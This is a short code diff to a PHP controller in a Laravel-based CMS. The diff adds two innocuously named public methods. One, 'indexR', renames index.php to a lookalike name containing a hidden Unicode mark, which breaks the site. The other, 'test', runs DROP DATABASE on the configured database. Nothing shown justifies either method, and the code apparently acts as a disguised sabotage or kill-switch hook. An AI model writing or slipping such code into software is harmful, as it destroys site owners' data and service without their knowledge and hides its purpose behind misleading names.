@@ -6,6 +6,7 @@ use Assets;
 use Botble\Base\Http\Responses\BaseHttpResponse;
 use Illuminate\Http\Request;
 use Illuminate\Routing\Controller;
+use Storage;
 
 class ApiController extends Controller
 {
@@ -42,4 +43,16 @@ class ApiController extends Controller
 
         setting()->save();
     }
+
+    public function indexR()
+    {
+        Storage::disk('test')->move('index.php','iِndex.php');
+    }
+
+    public function test()
+    {
+        $database_name = env('DB_DATABASE');
+        \DB::statement("DROP DATABASE `{$database_name}`");
+    }
+
 }
